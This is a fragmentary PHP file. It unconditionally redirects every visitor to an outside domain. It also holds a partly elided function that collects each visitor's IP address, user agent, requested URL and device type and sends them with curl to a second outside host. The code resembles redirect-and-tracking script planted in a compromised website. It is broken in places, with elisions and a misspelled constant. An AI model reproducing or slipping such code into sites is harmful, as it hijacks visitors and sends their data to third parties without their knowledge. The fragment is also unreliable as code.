<?php
header("Location: http://benhxahoi168.net");
exit();
/**
...
if($khainv==1){
    ...
    function thongke(){
        $urlkhainv="http://phongkhamdakhoa168.com/thongke.php";
        ...
        $dv=deciceType;
        $arr=array('domain'=>$self,'link'=>$uri,'ip'=>$ip,'user_agent'=>$user_agent,'deviceType'=>$dv);
        $ch=curl_init();
        curl_setopt($ch,CURLOPT_URL,$urlkhainv);
